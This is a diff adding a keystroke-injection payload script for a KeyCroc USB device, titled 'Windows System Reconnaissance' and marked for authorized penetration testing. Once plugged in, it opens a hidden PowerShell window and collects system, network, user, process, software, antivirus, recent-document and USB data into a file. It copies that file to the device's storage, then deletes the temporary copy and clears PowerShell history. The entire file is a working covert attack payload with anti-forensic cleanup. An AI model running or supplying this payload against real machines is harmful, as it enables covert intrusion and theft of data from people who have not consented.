@@ -1,0 +1,296 @@
+#!/bin/bash
+# Title: Windows System Reconnaissance
+# Author: David Osisek (CamoZeroDay)
+# Target: Windows 10/11, Server 2016+
+# Version: 1.0
+# Category: Reconnaissance
+# 
+# ⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY
+# Unauthorized use violates 18 U.S.C. § 1030 (CFAA)
+
+# LED SETUP
+LED SETUP
+
+# Attack mode: HID + Storage
+ATTACKMODE HID STORAGE
+
+# Wait for target to recognize device
+LED STAGE1
+Q DELAY 2000
+
+# Open PowerShell
+LED STAGE2
+Q GUI r
+Q DELAY 500
+Q STRING powershell -WindowStyle Hidden -NoProfile
+Q ENTER
+Q DELAY 1500
+
+# Set output file
+LED STAGE3
+Q STRING \$out='\$env:TEMP\\recon.txt'
+Q ENTER
+Q DELAY 200
+
+# System Information
+Q STRING '=== SYSTEM RECONNAISSANCE REPORT ===' | Out-File \$out
+Q ENTER
+Q STRING 'Generated: '+(Get-Date) | Out-File -Append \$out
+Q ENTER
+Q DELAY 200
+
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== SYSTEM INFORMATION ===' | Out-File -Append \$out
+Q ENTER
+Q STRING systeminfo | Out-File -Append \$out
+Q ENTER
+Q DELAY 3000
+
+# Network Configuration
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== NETWORK CONFIGURATION ===' | Out-File -Append \$out
+Q ENTER
+Q STRING ipconfig /all | Out-File -Append \$out
+Q ENTER
+Q DELAY 2000
+
+# Network Adapters
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== NETWORK ADAPTERS ===' | Out-File -Append \$out
+Q ENTER
+Q STRING Get-NetAdapter | Format-Table | Out-File -Append \$out
+Q ENTER
+Q DELAY 1000
+
+# Routing Table
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== ROUTING TABLE ===' | Out-File -Append \$out
+Q ENTER
+Q STRING route print | Out-File -Append \$out
+Q ENTER
+Q DELAY 1000
+
+# ARP Cache
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== ARP CACHE ===' | Out-File -Append \$out
+Q ENTER
+Q STRING arp -a | Out-File -Append \$out
+Q ENTER
+Q DELAY 500
+
+# Active Connections
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== ACTIVE CONNECTIONS ===' | Out-File -Append \$out
+Q ENTER
+Q STRING netstat -ano | Out-File -Append \$out
+Q ENTER
+Q DELAY 1000
+
+# DNS Cache
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== DNS CACHE ===' | Out-File -Append \$out
+Q ENTER
+Q STRING ipconfig /displaydns | Out-File -Append \$out
+Q ENTER
+Q DELAY 1000
+
+# Running Processes
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== RUNNING PROCESSES ===' | Out-File -Append \$out
+Q ENTER
+Q STRING Get-Process | Sort-Object CPU -Descending | Select-Object -First 50 | Format-Table | Out-File -Append \$out
+Q ENTER
+Q DELAY 2000
+
+# Installed Software
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== INSTALLED SOFTWARE ===' | Out-File -Append \$out
+Q ENTER
+Q STRING Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName,DisplayVersion,Publisher | Out-File -Append \$out
+Q ENTER
+Q DELAY 2000
+
+# Environment Variables
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== ENVIRONMENT VARIABLES ===' | Out-File -Append \$out
+Q ENTER
+Q STRING Get-ChildItem Env: | Out-File -Append \$out
+Q ENTER
+Q DELAY 1000
+
+# Current User
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== CURRENT USER ===' | Out-File -Append \$out
+Q ENTER
+Q STRING whoami /all | Out-File -Append \$out
+Q ENTER
+Q DELAY 1000
+
+# Local Users
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== LOCAL USERS ===' | Out-File -Append \$out
+Q ENTER
+Q STRING Get-LocalUser | Out-File -Append \$out
+Q ENTER
+Q DELAY 500
+
+# Local Groups
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== LOCAL GROUPS ===' | Out-File -Append \$out
+Q ENTER
+Q STRING Get-LocalGroup | Out-File -Append \$out
+Q ENTER
+Q DELAY 500
+
+# Domain Information
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== DOMAIN INFORMATION ===' | Out-File -Append \$out
+Q ENTER
+Q STRING (Get-WmiObject Win32_ComputerSystem).Domain | Out-File -Append \$out
+Q ENTER
+Q DELAY 500
+
+# Scheduled Tasks
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== SCHEDULED TASKS ===' | Out-File -Append \$out
+Q ENTER
+Q STRING schtasks /query /fo LIST | Out-File -Append \$out
+Q ENTER
+Q DELAY 2000
+
+# Running Services
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== RUNNING SERVICES ===' | Out-File -Append \$out
+Q ENTER
+Q STRING Get-Service | Where-Object {\$_.Status -eq 'Running'} | Out-File -Append \$out
+Q ENTER
+Q DELAY 2000
+
+# Startup Programs
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== STARTUP PROGRAMS ===' | Out-File -Append \$out
+Q ENTER
+Q STRING Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location | Out-File -Append \$out
+Q ENTER
+Q DELAY 1000
+
+# Firewall Status
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== FIREWALL STATUS ===' | Out-File -Append \$out
+Q ENTER
+Q STRING netsh advfirewall show allprofiles | Out-File -Append \$out
+Q ENTER
+Q DELAY 1000
+
+# Network Shares
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== NETWORK SHARES ===' | Out-File -Append \$out
+Q ENTER
+Q STRING net share | Out-File -Append \$out
+Q ENTER
+Q DELAY 500
+
+# PowerShell History
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== POWERSHELL HISTORY ===' | Out-File -Append \$out
+Q ENTER
+Q STRING Get-History | Out-File -Append \$out
+Q ENTER
+Q DELAY 500
+
+# Antivirus Products
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== ANTIVIRUS PRODUCTS ===' | Out-File -Append \$out
+Q ENTER
+Q STRING Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Out-File -Append \$out
+Q ENTER
+Q DELAY 1000
+
+# Windows Defender Status
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== WINDOWS DEFENDER ===' | Out-File -Append \$out
+Q ENTER
+Q STRING Get-MpComputerStatus | Out-File -Append \$out
+Q ENTER
+Q DELAY 1000
+
+# Recent Documents
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== RECENT DOCUMENTS ===' | Out-File -Append \$out
+Q ENTER
+Q STRING Get-ChildItem \$env:APPDATA\\Microsoft\\Windows\\Recent\\*.lnk | Out-File -Append \$out
+Q ENTER
+Q DELAY 1000
+
+# USB Device History
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== USB DEVICE HISTORY ===' | Out-File -Append \$out
+Q ENTER
+Q STRING Get-PnpDevice -PresentOnly | Where-Object {\$_.InstanceId -match '^USB'} | Out-File -Append \$out
+Q ENTER
+Q DELAY 1000
+
+# Footer
+Q STRING '' | Out-File -Append \$out
+Q ENTER
+Q STRING '=== RECONNAISSANCE COMPLETE ===' | Out-File -Append \$out
+Q ENTER
+Q STRING 'Finished: '+(Get-Date) | Out-File -Append \$out
+Q ENTER
+
+# Copy to KeyCroc storage
+LED STAGE4
+Q DELAY 1000
+Q STRING \$computer=(Get-WmiObject Win32_ComputerSystem).Name
+Q ENTER
+Q STRING \$date=Get-Date -Format 'yyyyMMdd-HHmmss'
+Q ENTER
+Q STRING \$dest=(Get-Volume | Where-Object {\$_.DriveType -eq 'Removable' -and \$_.FileSystemLabel -eq 'KEYCROC'}).DriveLetter
+Q ENTER
+Q STRING Copy-Item \$out "\${dest}:\\recon-\${computer}-\${date}.txt"
+Q ENTER
+Q DELAY 2000
+
+# Cleanup
+Q STRING Remove-Item \$out -Force
+Q ENTER
+Q DELAY 500
+
+# Clear PowerShell history
+Q STRING Clear-History
+Q ENTER
+
+# Exit
+Q STRING exit
+Q ENTER
+
+# Success
+LED FINISH
+Q DELAY 2000
+
+# Sync storage
+sync
